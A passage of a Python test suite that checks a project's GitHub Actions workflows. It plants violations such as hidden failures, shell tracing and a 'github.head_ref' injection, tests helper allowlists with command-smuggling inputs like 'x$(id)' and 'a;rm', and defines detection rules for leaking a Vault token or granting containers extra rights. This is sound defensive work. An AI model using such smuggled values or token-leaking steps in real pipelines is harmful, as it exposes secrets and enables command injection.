            "      - name: Verdict (fails unless every step has exit=0; a step that did not run is NOT RUN)\n"
            "        env:\n          X: y\n",
        ),
        "verdict-golden",
    ),
    "verdict with its own shell": (
        lambda t: t.replace(
            "      - name: Verdict (fails unless every step has exit=0; a step that did not run is NOT RUN)\n",
            "      - name: Verdict (fails unless every step has exit=0; a step that did not run is NOT RUN)\n"
            "        shell: bash {0}\n",
        ),
        "verdict-golden",
    ),
    "extra trigger push": (
        lambda t: t.replace("on:\n  workflow_dispatch:", "on:\n  push:\n  workflow_dispatch:"),
        "trigger",
    ),
    "extra trigger pull_request_target": (
        lambda t: t.replace(
            "on:\n  workflow_dispatch:", "on:\n  pull_request_target:\n  workflow_dispatch:"
        ),
        "trigger",
    ),
    "job switched off": (
        lambda t: t.replace("    needs: plan\n", "    needs: plan\n    if: ${{ false }}\n"),
        "job-if",
    ),
    "plan job with a condition": (
        lambda t: t.replace(
            "  plan:\n    runs-on: ubuntu-24.04\n",
            "  plan:\n    if: ${{ github.actor != 'x' }}\n    runs-on: ubuntu-24.04\n",
        ),
        "job-if",
    ),
    "matrix include": (
        lambda t: t.replace(
            "        python: ${{ fromJSON(needs.plan.outputs.pythons) }}\n",
            "        python: ${{ fromJSON(needs.plan.outputs.pythons) }}\n        include:\n          - python: '3.9'\n",
        ),
        "strategy",
    ),
    "matrix exclude": (
        lambda t: t.replace(
            "        python: ${{ fromJSON(needs.plan.outputs.pythons) }}\n",
            "        python: ${{ fromJSON(needs.plan.outputs.pythons) }}\n        exclude:\n          - python: '3.13'\n",
        ),
        "strategy",
    ),
    "fail-fast on": (
        lambda t: t.replace("      fail-fast: false\n", "      fail-fast: true\n"),
        "strategy",
    ),
    "max-parallel": (
        lambda t: t.replace(
            "      fail-fast: false\n", "      fail-fast: false\n      max-parallel: 1\n"
        ),
        "strategy",
    ),
    "strategy on the plan job": (
        lambda t: t.replace(
            "  plan:\n    runs-on: ubuntu-24.04\n",
            "  plan:\n    strategy:\n      fail-fast: false\n    runs-on: ubuntu-24.04\n",
        ),
        "strategy",
    ),
    "helper path overridden for one step": (
        lambda t: t.replace(
            "      - name: Performance tests\n",
            "      - name: Performance tests\n        env:\n          TOOL: /bin/true\n",
        ),
        "override-env",
    ),
    "log folder overridden in the job": (
        lambda t: t.replace(
            "      PY: ${{ matrix.python }}",
            "      PY: ${{ matrix.python }}\n      EVIDENCE_DIR: /tmp/x",
        ),
        "override-env",
    ),
    "pinned tables variable in the job env": (
        lambda t: t.replace(
            "      PY: ${{ matrix.python }}",
            "      PY: ${{ matrix.python }}\n      HADAVIN_REQUIRE_PINNED_UNIDATA: ${{ matrix.python == '3.13' && '1' || '' }}",
        ),
        "pinned-unidata",
    ),
    "pinned tables step on every leg": (
        lambda t: t.replace(
            "        if: ${{ matrix.python == '3.13' }}\n", "        if: ${{ always() }}\n"
        ),
        "pinned-unidata",
    ),
    "pinned tables step missing": (
        lambda t: t.replace(
            'echo "HADAVIN_REQUIRE_PINNED_UNIDATA=1" >> "$GITHUB_ENV"', "echo nothing"
        ),
        "pinned-unidata",
    ),
    "step-level empty server address": (
        lambda t: t.replace(
            "      - name: Performance tests\n",
            '      - name: Performance tests\n        env:\n          HADAVIN_TEST_VAULT_ADDR: ""\n',
        ),
        "addr-missing",
    ),
    "tracing switched on through the environment file": (
        lambda t: t.replace(
            '          echo "ART=evidence-',
            '          echo "SHELLOPTS=xtrace" >> "$GITHUB_ENV"\n          echo "ART=evidence-',
        ),
        "shell-trace",
    ),
    "tracing by xtracefd in the workflow": (
        lambda t: t.replace(
            "permissions:\n  contents: read\n\n# A second",
            'permissions:\n  contents: read\n\nenv:\n  BASH_XTRACEFD: "1"\n\n# A second',
            1,
        ),
        "trace-env",
    ),
    "debug logging by step env": (
        lambda t: t.replace(
            "      - name: Performance tests\n",
            '      - name: Performance tests\n        env:\n          ACTIONS_STEP_DEBUG: "true"\n',
        ),
        "trace-env",
    ),
}


@pytest.mark.parametrize("name", sorted(PLANTS))
def test_each_rule_fails_on_a_planted_violation(name):
    plant, rule = PLANTS[name]
    text = WORKFLOW.read_text(encoding="utf-8")
    planted = plant(text)
    assert planted != text, f"plant {name} did not change the text"
    found = problems(planted)
    assert any(p.startswith(f"[{rule}]") for p in found), (name, rule, found)


def test_every_evidence_rule_has_a_plant():
    source = Path(__file__).read_text(encoding="utf-8")
    ids = set(re.findall(r'\badd\(\s*out,\s*"([a-z0-9-]+)"', source))
    planted = {rule for _, rule in PLANTS.values()} | {rule for _, rule in VAULT_PLANTS.values()}
    planted |= {rule for _, rule in GENERAL_PLANTS.values()}
    assert not ids - planted, f"rules without a planted violation: {sorted(ids - planted)}"


# General-rule plants against every other workflow file (ci.yml today, any new file tomorrow).
GENERAL_PLANTS = {
    "unpinned action": (
        lambda t: re.sub(r"(actions/checkout)@[0-9a-f]{40}", r"\1@v7", t, count=1),
        "unpinned",
    ),
    "write permission": (
        lambda t: t.replace("permissions:\n  contents: read", "permissions:\n  contents: write", 1),
        "top-permissions",
    ),
    "job write permission": (
        lambda t: re.sub(
            r"(\n    timeout-minutes: \d+\n)",
            r"\1    permissions:\n      contents: write\n",
            t,
            count=1,
        ),
        "job-permissions",
    ),
    "no job timeout": (
        lambda t: re.sub(r"\n    timeout-minutes: \d+", "", t, count=1),
        "job-timeout",
    ),
    "continue on error": (
        lambda t: re.sub(
            r"(\n    runs-on: ubuntu-24\.04\n)", r"\1    continue-on-error: true\n", t, count=1
        ),
        "continue-on-error",
    ),
    "or true on a test line": (
        lambda t: t.replace("run: pytest -q -m perf -rs", "run: pytest -q -m perf -rs || true"),
        "hiding",
    ),
    "set +e": (
        lambda t: t.replace(
            "run: python tools/scan_repo.py", "run: set +e; python tools/scan_repo.py"
        ),
        "hiding",
    ),
    "injection": (
        lambda t: t.replace("run: psql --version", "run: echo ${{ github.head_ref }}"),
        "injection",
    ),
    "step switched off": (
        lambda t: t.replace(
            "      - name: Lint\n", "      - name: Lint\n        if: ${{ false }}\n"
        ),
        "if-false",
    ),
    "local action": (
        lambda t: re.sub(
            r"uses: actions/checkout@[0-9a-f]{40}", "uses: ./.github/actions/x", t, count=1
        ),
        "local-action",
    ),
    "job without steps": (
        lambda t: t.replace("    steps:\n", "    xsteps:\n", 1),
        "no-steps",
    ),
    "timeout as an expression": (
        lambda t: re.sub(
            r"\n    timeout-minutes: \d+", "\n    timeout-minutes: ${{ 30 }}", t, count=1
        ),
        "expression-timeout",
    ),
    "step timeout as an expression": (
        lambda t: t.replace(
            "        timeout-minutes: 5\n", "        timeout-minutes: ${{ 5 }}\n", 1
        ),
        "expression-timeout",
    ),
    "step switched off by a bare false": (
        lambda t: t.replace("      - name: Lint\n", "      - name: Lint\n        if: false\n"),
        "if-false",
    ),
    "step switched off by and-false": (
        lambda t: t.replace(
            "      - name: Lint\n", "      - name: Lint\n        if: ${{ success() && false }}\n"
        ),
        "if-false",
    ),
    "tracing through the environment file": (
        lambda t: t.replace(
            "run: python tools/scan_repo.py", 'run: echo "BASH_ENV=x" >> "$GITHUB_ENV"'
        ),
        "shell-trace",
    ),
    "tracing by shellopts": (
        lambda t: t.replace("  GITLEAKS_VERSION:", "  SHELLOPTS: xtrace\n  GITLEAKS_VERSION:", 1),
        "trace-env",
    ),
    "tracing by default shell": (
        lambda t: t.replace(
            "jobs:\n  check:", "defaults:\n  run:\n    shell: bash -x {0}\n\njobs:\n  check:"
        ),
        "shell-override",
    ),
}


@pytest.mark.parametrize("name", sorted(GENERAL_PLANTS))
def test_each_general_rule_fires_on_ci_yml_too(name):
    plant, rule = GENERAL_PLANTS[name]
    text = (WORKFLOW_DIR / "ci.yml").read_text(encoding="utf-8")
    planted = plant(text)
    assert planted != text, f"plant {name} did not change ci.yml"
    found = workflow_problems(planted, "ci.yml")
    assert any(p.startswith(f"[{rule}]") for p in found), (name, rule, found)


def test_ci_yml_keeps_its_two_grep_counters_but_not_a_hidden_test_failure():
    text = (WORKFLOW_DIR / "ci.yml").read_text(encoding="utf-8")
    assert "|| true" in text and workflow_problems(text, "ci.yml") == []
    planted = text.replace("run: python tools/scan_repo.py", "run: pytest -q || exit 0")
    assert any(p.startswith("[hiding]") for p in workflow_problems(planted, "ci.yml"))


def test_a_command_split_over_two_lines_is_not_taken_for_a_bare_test():
    text = WORKFLOW.read_text(encoding="utf-8")
    split = text.replace(
        'run: python3 "$TOOL" run perf -- pytest -q -m perf -rfEs',
        'run: |\n          python3 "$TOOL" run perf -- \\\n            pytest -q -m perf -rfEs',
    )
    assert split != text and not [p for p in problems(split) if p.startswith("[bare-test]")]


# --- the helper --------------------------------------------------------------------------------------


def test_allowlists_refuse_odd_input():
    for bad in ("", "-x", "a b", "a..b", "a;rm", "x$(id)", "a" * 201, "a/", "a.lock"):
        with pytest.raises(es.Refused):
            es.check_ref(bad)
    assert es.check_ref("core/ci-evidence") == "core/ci-evidence"
    for bad in (
        "not json",
        "{}",
        "[]",
        '["3.12","3.13","3.14","3.12","3.13"]',  # five versions the pattern accepts: only the count refuses
        '["3.11"]',
        '["3.13; id"]',
        "[3.13]",
        '["4.0"]',
        '["3.x"]',
    ):
        with pytest.raises(es.Refused):
            es.check_pythons(bad)
    assert es.check_pythons('["3.13","3.12","3.13"]') == ["3.13", "3.12"]
    for bad in (
        "tests/x.py",
        "../tests/a_mutants.py",
        "tests/A_mutants.py",
        "tests/a_mutants.py;id",
        "tests/a b_mutants.py x",
    ):
        with pytest.raises(es.Refused):
            es.check_mutants(bad)
    with pytest.raises(es.Refused):
        es.check_mutants(" ".join(f"tests/m{i}_mutants.py" for i in range(9)))
    assert es.check_mutants("tests/stage_mutants.py  tests/stage_mutants.py") == [
        "tests/stage_mutants.py"
    ]


RUNNER_ONLY = {
    "EVIDENCE_DIR",
    "GITHUB_STEP_SUMMARY",
    "GITHUB_OUTPUT",
    "GITHUB_ENV",
    "GITHUB_PATH",
    "GITHUB_STATE",
    "HADAVIN_TEST_VAULT_TOKEN",
}


def helper(cwd: Path, *args: str, env: dict | None = None) -> subprocess.CompletedProcess:
    # The runner's own files (job summary, step outputs, the per-run Vault token) must never reach the helper under
    # test: a guard test would append fake tables to the real job summary and use the real token.
    inherited = {k: v for k, v in os.environ.items() if k not in RUNNER_ONLY}
    full = {**inherited, **(env or {})}
    return subprocess.run(  # noqa: S603  # our own interpreter and a file of this repository, no shell
        [sys.executable, str(ROOT / "tools" / "evidence_step.py"), *args],
        cwd=cwd,
        capture_output=True,
        text=True,
        env=full,
        check=False,
    )


def test_a_failing_command_keeps_its_exit_code_and_a_later_step_still_runs(tmp_path):
    first = helper(
        tmp_path, "run", "bad", "--", sys.executable, "-c", "print('boom'); raise SystemExit(3)"
    )
    assert first.returncode == 3
    second = helper(tmp_path, "run", "good", "--", sys.executable, "-c", "print('fine')")
    assert second.returncode == 0
    status = (tmp_path / "evidence-logs" / "status.txt").read_text().splitlines()
    assert status == ["bad\texit=3", "good\texit=0"]
    log = (tmp_path / "evidence-logs" / "bad.txt").read_text().splitlines()
    assert "boom" in log and log[-1] == "exit=3"


def test_a_command_that_does_not_exist_is_recorded_as_127(tmp_path):
    done = helper(tmp_path, "run", "gone", "--", "no-such-program-xyz")
    assert done.returncode == 127
    assert "gone\texit=127" in (tmp_path / "evidence-logs" / "status.txt").read_text()


@pytest.mark.skipif(os.name == "nt", reason="the execute bit is a POSIX notion")
def test_a_command_that_exists_but_cannot_be_started_is_recorded_as_126(tmp_path):
    script = tmp_path / "not-executable.sh"
    script.write_text("#!/bin/sh\nexit 0\n")
    script.chmod(0o644)
    done = helper(tmp_path, "run", "denied", "--", str(script))
    assert done.returncode == 126
    assert "denied\texit=126" in (tmp_path / "evidence-logs" / "status.txt").read_text()


def test_the_runner_files_do_not_reach_the_helper_under_test(tmp_path, monkeypatch):
    summary = tmp_path / "real-summary.md"
    monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary))
    monkeypatch.setenv("GITHUB_OUTPUT", str(tmp_path / "real-output.txt"))
    monkeypatch.setenv("HADAVIN_TEST_VAULT_TOKEN", "tok" + "-" + "real0value1234")
    work = tmp_path / "work"
    work.mkdir()
    helper(work, "run", "x", "--", sys.executable, "-c", "print('tok-real0value1234')")
    helper(work, "report", "x")
    planned = helper(
        work, "plan", env={"INPUT_REF": "main", "INPUT_PYTHONS": '["3.13"]', "INPUT_MUTANTS": ""}
    )
    assert (
        planned.returncode == 0 and "ref=main" in planned.stdout
    )  # went to stdout, not to the real file
    assert not summary.exists() and not (tmp_path / "real-output.txt").exists()
    assert (
        "tok-real0value1234" in (work / "evidence-logs" / "x.txt").read_text()
    )  # not masked: the token was not inherited


@pytest.mark.skipif(shutil.which("bash") is None, reason="bash needed for the exit-code check")
def test_the_helper_keeps_the_exit_code_when_run_under_bash_e(tmp_path):
    """The workflow's default shell is `bash -e`: the failing command must still be recorded and its code returned."""
    bash = shutil.which("bash")
    script = f'set -e; "{sys.executable}" "{ROOT / "tools" / "evidence_step.py"}" run bad -- false; echo after'
    env = {k: v for k, v in os.environ.items() if k not in RUNNER_ONLY}
    done = subprocess.run(  # noqa: S603  # fixed argv, no shell
        [bash, "-c", script], cwd=tmp_path, capture_output=True, text=True, env=env, check=False
    )
    assert done.returncode == 1 and "after" not in done.stdout
    assert "bad\texit=1" in (tmp_path / "evidence-logs" / "status.txt").read_text()


def test_the_report_fails_on_a_non_zero_exit_and_on_a_step_that_never_ran(tmp_path):
    helper(tmp_path, "run", "ok", "--", sys.executable, "-c", "pass")
    assert helper(tmp_path, "report", "ok").returncode == 0
    missing = helper(tmp_path, "report", "ok", "perf")
    assert missing.returncode == 1 and "| perf | NOT RUN (never finished" in missing.stdout
    helper(tmp_path, "run", "bad", "--", sys.executable, "-c", "raise SystemExit(5)")
    failed = helper(tmp_path, "report", "ok")
    assert failed.returncode == 1 and "| bad | exit=5 |" in failed.stdout


def test_the_plan_command_writes_only_checked_values(tmp_path):
    out = tmp_path / "out.txt"
    env = {
        "INPUT_REF": "main",
        "INPUT_PYTHONS": '["3.13"]',
        "INPUT_MUTANTS": "",
        "GITHUB_OUTPUT": str(out),
    }
    assert helper(tmp_path, "plan", env=env).returncode == 0
    assert out.read_text().splitlines() == ['pythons=["3.13"]', "mutants=", "ref=main"]
    env["INPUT_PYTHONS"] = '["3.13\\nx=1"]'
    assert helper(tmp_path, "plan", env=env).returncode == 2


@pytest.mark.skipif(shutil.which("bash") is None, reason="bash needed for the exit-code lesson")
def test_bash_demo_the_old_pattern_lost_the_exit_code_under_bash_e():
    """Not a check of this repo: a demonstration of why the helper exists. Under `bash -e` the old `cmd; rc=$?` never recorded exit= for a failing command."""
    old = "set -e; { false; rc=$?; echo exit=$rc; exit $rc; } | cat"
    bash = shutil.which("bash")
    done = subprocess.run([bash, "-c", old], capture_output=True, text=True, check=False)  # noqa: S603  # fixed argv
    assert "exit=" not in done.stdout


def test_a_repeated_step_name_is_refused_and_the_first_log_is_kept(tmp_path):
    assert (
        helper(
            tmp_path, "run", "stage-mutants", "--", sys.executable, "-c", "raise SystemExit(4)"
        ).returncode
        == 4
    )
    again = helper(tmp_path, "run", "stage-mutants", "--", sys.executable, "-c", "pass")
    assert again.returncode == 2 and "already used" in again.stderr
    assert (tmp_path / "evidence-logs" / "stage-mutants.txt").read_text().splitlines()[
        -1
    ] == "exit=4"
    assert helper(tmp_path, "report", "stage-mutants").returncode == 1


def test_the_report_fails_on_repeated_rows_even_when_the_last_one_is_green(tmp_path):
    logs = tmp_path / "evidence-logs"
    logs.mkdir()
    (logs / "status.txt").write_text("a\texit=1\na\texit=0\n")
    done = helper(tmp_path, "report", "a")
    assert done.returncode == 1 and "DUPLICATE" in done.stdout


def test_the_report_shows_skip_counts_and_fails_on_a_missing_test_variable(tmp_path):
    helper(
        tmp_path,
        "run",
        "pytest",
        "--",
        sys.executable,
        "-c",
        "print('SKIPPED [2] tests/x.py:1: slow')",
    )
    ok = helper(tmp_path, "report", "pytest")
    assert ok.returncode == 0 and "| pytest | exit=0 | 2 |" in ok.stdout
    code = "print('SKIPPED [3] tests/x.py:1: HADAVIN_TEST_PG_DSN not set (the postgres service runs in CI)')"
    helper(tmp_path, "run", "perf", "--", sys.executable, "-c", code)
    bad = helper(tmp_path, "report", "pytest", "perf")
    assert (
        bad.returncode == 1
        and "3 test(s) skipped for a reason that names a HADAVIN_TEST_ variable or says HADAVIN_REQUIRE_PINNED_UNIDATA is required but not set"
        in bad.stdout
    )


def test_a_step_that_never_finished_says_so(tmp_path):
    done = helper(tmp_path, "report", "perf")
    assert "never finished: skipped, timed out or cancelled" in done.stdout and done.returncode == 1


def test_odd_versions_and_long_runner_names_are_refused_with_exit_2():
    for bad in (
        f'["3.{"9" * 5000}"]',
        '["3.012"]',
        '["3.0013"]',
        '["3.7"]',
        '["3.99"]',
        '["3.15"]',
    ):
        with pytest.raises(es.Refused):
            es.check_pythons(bad)
    with pytest.raises(es.Refused):
        es.check_mutants("tests/" + "a" * 41 + "_mutants.py")
    with pytest.raises(es.Refused, match="letters, digits"):
        es.check_ref("bad ref")


@pytest.mark.parametrize("ref", ["pull/84/head", "pull/84/merge", "refs/pull/84/head", "pull/x"])
def test_a_pull_request_ref_is_refused_with_the_reason(ref):
    with pytest.raises(es.Refused, match="pull/N/head"):
        es.check_ref(ref)
    assert es.check_ref("core/pull-fix") == "core/pull-fix"


@pytest.mark.parametrize(
    "reason",
    [
        "is unset",
        "is missing",
        "not defined",
        "is empty",
        "not set",
        "cannot connect",
        "needs it",
        "",
    ],
)
def test_every_wording_of_a_missing_test_variable_fails_the_report(tmp_path, reason):
    code = f"print('SKIPPED [1] tests/x.py:1: HADAVIN_TEST_VAULT_ADDR {reason}')"
    helper(tmp_path, "run", "pytest", "--", sys.executable, "-c", code)
    assert helper(tmp_path, "report", "pytest").returncode == 1


# --- the Vault development server in every workflow (ci.yml and evidence.yml) ---------------------------------


IMAGE_RE = re.compile(r"hashicorp/vault:[0-9.]+@sha256:[0-9a-f]{64}")
IMAGE_VAR = r"\$\{?VAULT_IMAGE\}?"
VALUE_REF_RE = r"\$\{?(token|HADAVIN_TEST_VAULT_TOKEN|VAULT_DEV_ROOT_TOKEN_ID)\b"
MASK_LINE = 'echo "::add-mask::$token"'
ENV_LINE = 'echo "HADAVIN_TEST_VAULT_TOKEN=$token" >> "$GITHUB_ENV"'
PROBE_LINE = (
    'printf \'header = "X-Vault-Token: %s"\\n\' "$token" | curl -fsS --max-time 5 -o /dev/null -K - '
    "http://127.0.0.1:8200/v1/auth/token/lookup-self && exit 0"
)
LOGS_FILTER = "grep -viE 'unseal key|root token' | sed \"s/$token/***/g\""
TEST_ENV = "HADAVIN_TEST_VAULT_ADDR"
# A test command: a line that starts with pytest (also after `uv run` or `python -m`), or a helper call that runs a
# test step. The word pytest inside another command (the verdict's list of step names) does not count.
IS_TEST = re.compile(
    r"^(uv run )?(python3? -m )?pytest\b|\$TOOL\"? run (pytest|perf|stage-mutants|\"\$name\")\b"
)
CMD_POS = r"(^|[;&|({]\s*|\bdo\s+|\bthen\s+)"  # where a command word can stand in a shell line
RUN_RE = re.compile(
    r"\b(docker|podman)\s+(container\s+)?run\b|\bdocker[- ]compose\b|\bdocker\s+compose\b"
)
INSTALLS = re.compile(r"\buv\s+sync\b|\bpip3?\s+install\b|\buv\s+pip\s+install\b")

CURL_CMD_RE = re.compile(
    CMD_POS
    + r"(?:\w+=\S*\s+)*(?:(?:sudo|timeout\s+\S+|env|command|exec|nohup)\s+)*curl\s+(?P<args>[^;&|]*)"
)
# short options that take a value: the rest of the word is the value
CURL_VALUE_FLAGS = frozenset("oHdKmuAebcwxXTErCyYzFDQ")


def curl_is_verbose(line: str) -> bool:
    """True if a curl command (curl standing where a command can stand, so `command -v curl` or a word list that
    only names curl is not one) is given a flag that makes it print the request headers, so the Vault token header would
    reach the log: -v, --verbose, a short-flag word that contains v before any value-taking letter (-vv, -sSv, -fsSv), or
    --trace, --trace-ascii, --trace-time and the like. Other flags that merely contain the letter v or t in their name
    (--tlsv1.2, --retry-all-errors, --proto-redir) are not verbose flags."""
    for m in CURL_CMD_RE.finditer(line):
        try:
            words = shlex.split(m.group("args"))
        except ValueError:
            words = m.group("args").split()
        for w in words:
            if w == "--verbose" or w.startswith("--trace"):
                return True
            if w.startswith("-") and not w.startswith("--") and len(w) > 1:
                for ch in w[1:]:
                    if ch == "v":
                        return True
                    if ch in CURL_VALUE_FLAGS:
                        break
    return False


def docker_run_lines(script: str) -> list[str]:
    """Each `docker run ...` (or podman run, docker container run, docker compose) command of a script, from the words docker run to the end of its logical line (line
    continuations joined). It is found anywhere on a line, so `sudo docker run`, `timeout 5 docker run` and
    `cmd && docker run` are found too."""
    found = []
    for line in logical_lines(script):
        m = RUN_RE.search(line)
        if m:
            found.append(line[m.start() :])
    return found


def vault_problems(text: str) -> list[str]:
    """Rules for any workflow job that uses a Vault server: one random value, made in a step, masked before it is
    written anywhere, handed to the container and to the tests, never printed, never in a command line and never a
    literal; the container is published on loopback only, removed by name after the last test step, and the image is
    one pinned digest. A service cannot read a step's output, so there is no Vault service. Every `docker run` in a
    job is treated as the Vault start and must meet all of this."""
    wf = load(text)
    out: list[str] = []
    if re.search(r"VAULT_DEV_ROOT_TOKEN_ID:\s*\S", text) or re.search(
        r"HADAVIN_TEST_VAULT_TOKEN:\s*\S", text
    ):
        add(out, "literal-token", "a literal Vault token is set in an env block")
    if re.search(r"\btoken\W+root\b", text):
        add(out, "token-root", "the literal token 'root' appears")
    digests = set(IMAGE_RE.findall(text))
    if len(digests) > 1:
        add(
            out,
            "two-digests",
            f"more than one Vault image digest in one workflow: {sorted(digests)}",
        )
    for jname, job in wf["jobs"].items():
        steps = job["steps"]
        for sname, svc in (job.get("services") or {}).items():
            blob = json.dumps(svc).lower() + sname.lower()
            if "vault" in blob:
                add(
                    out,
                    "vault-as-service",
                    f"job {jname}: service {sname!r} is a Vault server (its token cannot be generated)",
                )
        for st in steps:
            run = st.get("run", "")
            for line in logical_lines(run):
                if re.search(
                    CMD_POS + r"(?:(?:env|printenv|declare\s+-x)\b|(?:export(?:\s+-p)?|set)\s*$)",
                    line,
                ) or (
                    re.search(CMD_POS + r"(?:cat|tee)\b", line) and re.search(VALUE_REF_RE, line)
                ):
                    add(
                        out,
                        "prints-env",
                        f"job {jname}: a line could print the environment or the token: {line[:40]}",
                    )
                if "<<<" in line and re.search(VALUE_REF_RE, line):
                    add(
                        out,
                        "here-string",
                        f"job {jname}: a here-string passes the token to a command",
                    )
                if re.search(
                    r"\bsudo\b|docker\s+exec\b|docker\.sock|--pid[= ]host|--ipc[= ]host|--cap-add",
                    line,
                ):
                    add(
                        out,
                        "extra-rights",
                        f"job {jname}: sudo, docker exec, docker.sock or extra rights: {line[:40]}",
                    )
                if curl_is_verbose(line):
                    add(
                        out,
                        "curl-verbose",
                        f"job {jname}: curl in verbose mode would print the token header",
                    )
                if (
                    re.search(r"\bcurl\s", line)
                    and (re.search(VALUE_REF_RE, line) or "X-Vault-Token" in line)
                    and line != PROBE_LINE
                ):
                    add(
                        out,
                        "token-in-argv",
                        f"job {jname}: curl gets the token in its command line: {line[:50]}",
                    )
                if (
                    re.search(CMD_POS + r"(echo|printf)\b", line)
                    and re.search(VALUE_REF_RE, line)
                    and line not in (MASK_LINE, ENV_LINE)
                    and not line.startswith(PROBE_LINE.split(" | ")[0])
                ):
                    add(out, "prints-token", f"job {jname}: a line prints the token: {line[:50]}")
                if "docker logs" in line and LOGS_FILTER not in line:
                    add(
                        out,
                        "logs-filter",
                        f"job {jname}: docker logs must be filtered for the unseal key, root token and token",
                    )
        starts = [i for i, st in enumerate(steps) if docker_run_lines(st.get("run", ""))]
        env_text = json.dumps(wf.get("env", {})) + json.dumps(job)
        if TEST_ENV in env_text and not starts:
            add(
                out, "no-start", f"job {jname}: the tests use a Vault server but no step starts one"
            )
        if not starts:
            continue
        merged_env = {**(wf.get("env") or {}), **(job.get("env") or {})}
        if any(re.search(IMAGE_VAR, steps[i]["run"]) for i in starts) and not IMAGE_RE.fullmatch(
            str(merged_env.get("VAULT_IMAGE", ""))
        ):
            add(
                out,
                "image-undefined",
                f"job {jname}: $VAULT_IMAGE is not defined as a pinned digest in env",
            )
        for i in starts:
            script = steps[i]["run"]
            label = f"job {jname} step {i}"
            code = logical_lines(script)
            if "openssl rand" not in script:
                add(
                    out,
                    "no-openssl",
                    f"{label}: the Vault token is not generated with openssl rand",
                )
            if MASK_LINE not in script or ENV_LINE not in script:
                add(
                    out,
                    "mask-lines",
                    f"{label}: missing the mask line or the line that hands the token to the tests",
                )
            elif script.index(MASK_LINE) > script.index(ENV_LINE):
                add(
                    out,
                    "mask-order",
                    f"{label}: the mask line must come before the token is written to GITHUB_ENV",
                )
            if MASK_LINE in code:
                before = code[: code.index(MASK_LINE)]
                for ln in before:
                    if re.search(VALUE_REF_RE, ln) and not ln.startswith("token="):
                        add(
                            out,
                            "token-before-mask",
                            f"{label}: the token is used before it is masked: {ln[:50]}",
                        )
            if 'export VAULT_DEV_ROOT_TOKEN_ID="$token"' not in script:
                add(out, "same-token", f"{label}: the container does not get the same $token")
            if script.count("token=") != 1:
                add(out, "one-token", f"{label}: more than one token value")
            for cmd in docker_run_lines(script):
                if re.search(r"VAULT_DEV_ROOT_TOKEN_ID=|--env\b|--env-file", cmd):
                    add(
                        out,
                        "token-by-value",
                        f"{label}: the container gets its token by value or by file, not by -e NAME",
                    )
                if (
                    len(re.findall(r"(?:^|\s)(?:-p|--publish)(?:\s|=)", cmd)) != 1
                    or "-p 127.0.0.1:8200:8200 " not in cmd + " "
                ):
                    add(
                        out,
                        "port",
                        f"{label}: exactly one port, -p 127.0.0.1:8200:8200, is allowed",
                    )
                if re.search(
                    r"(?:^|\s)(-P|--publish-all|--privileged|--network[= ]host|--net[= ]host)(?:\s|$)",
                    cmd,
                ):
                    add(
                        out,
                        "host-network",
                        f"{label}: -P, --privileged or host networking is not allowed",
                    )
                if "-e VAULT_DEV_ROOT_TOKEN_ID " not in cmd:
                    add(
                        out,
                        "e-name",
                        f"{label}: the container must get -e VAULT_DEV_ROOT_TOKEN_ID (no value)",
                    )
                if re.search(
                    r"--security-opt\s+\S*(unconfined|seccomp|apparmor)|--cap-add|--device|(^|\s)(-v|--volume|--mount)\b|--user\s+0|--pid|--ipc",
                    cmd,
                ):
                    add(
                        out,
                        "container-rights",
                        f"{label}: extra container rights or mounts are not allowed",
                    )
                if not re.search(rf'"{IMAGE_VAR}"', cmd):
                    add(out, "image-var", f'{label}: the image must be given as "$VAULT_IMAGE"')
                if "--name vault-ci " not in cmd:
                    add(out, "container-name", f"{label}: the container must be named vault-ci")
            if PROBE_LINE not in code:
                add(
                    out,
                    "probe",
                    f"{label}: no readiness probe from the host with the token on curl's standard input",
                )
            if [ln for ln in code if ln][-1:] != ["exit 1"]:
                add(
                    out,
                    "exit-1",
                    f"{label}: the step must end with exit 1 after the waiting loop times out",
                )
            if re.search(r"hashicorp/vault", "\n".join(code)):
                add(
                    out,
                    "literal-image",
                    f"{label}: the image must come from $VAULT_IMAGE, not a literal in the script",
                )
            if "docker logs" not in script or "docker ps" not in script:
                add(out, "diagnostics", f"{label}: no container diagnostics on failure")
            if "docker inspect" not in script:
                add(out, "inspect", f"{label}: no fast failure when the container has exited")
        test_steps = []
        for i, st in enumerate(steps):
            if any(IS_TEST.search(ln) for ln in logical_lines(st.get("run", ""))):
                test_steps.append(i)
                merged = {
                    **(wf.get("env") or {}),
                    **(job.get("env") or {}),
                    **(st.get("env") or {}),
                }
                if not str(merged.get(TEST_ENV) or "").strip():
                    add(
                        out,
                        "addr-missing",
                        f"job {jname} step {i}: a test step without a non-empty {TEST_ENV} would use the in-process fake",
                    )
        last_test = max(test_steps or [-1])
        first_test = min(test_steps or [10**6])
        if first_test < starts[0]:
            add(out, "test-before-vault", f"job {jname}: a test step runs before the Vault step")
        for i, st in enumerate(steps):
            if i > starts[0] and INSTALLS.search(st.get("run", "")):
                add(
                    out,
                    "install-after-vault",
                    f"job {jname}: an install step runs after the token exists",
                )
        removal = [
            i for i, st in enumerate(steps) if "docker" in st.get("run", "") and " rm " in st["run"]
        ]
        if not removal:
            add(out, "no-removal", f"job {jname}: the Vault container is never removed")
        for i in removal:
            if steps[i].get("if") != "${{ always() }}":
                add(out, "removal-always", f"job {jname}: the Vault removal must run with always()")
            if "name=^vault-ci$" not in steps[i]["run"]:
                add(
                    out,
                    "removal-name",
                    f"job {jname}: the Vault removal must target name=^vault-ci$",
                )
            if "xargs" in steps[i]["run"] and "set -o pipefail" not in steps[i]["run"]:
                add(
                    out,
                    "removal-pipefail",
                    f"job {jname}: the removal pipes into xargs without set -o pipefail",
                )
            if i < last_test:
                add(
                    out,
                    "removal-early",
                    f"job {jname}: the Vault removal comes before the last test step",
                )
    return out


def all_vault_problems(text: str, name: str) -> list[str]:
    return [*workflow_problems(text, name), *vault_problems(text)]


def test_all_vault_image_digests_are_equal_across_workflows():
    found = {m for path in WORKFLOWS for m in IMAGE_RE.findall(path.read_text(encoding="utf-8"))}
    assert len(found) == 1, found


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_workflow_makes_its_vault_token_fresh(path):
    assert vault_problems(path.read_text(encoding="utf-8")) == []


def vault_start_scripts() -> dict[str, str]:
    """The code lines of every Vault start step in every workflow, keyed by 'file:job'."""
    found = {}
    for path in WORKFLOWS:
        for jname, job in load(path.read_text(encoding="utf-8"))["jobs"].items():
            for st in job["steps"]:
                if docker_run_lines(st.get("run", "")):
                    found[f"{path.name}:{jname}"] = "\n".join(logical_lines(st["run"]))
    return found


def test_the_vault_start_script_is_the_same_in_every_workflow_and_job():
    scripts = vault_start_scripts()
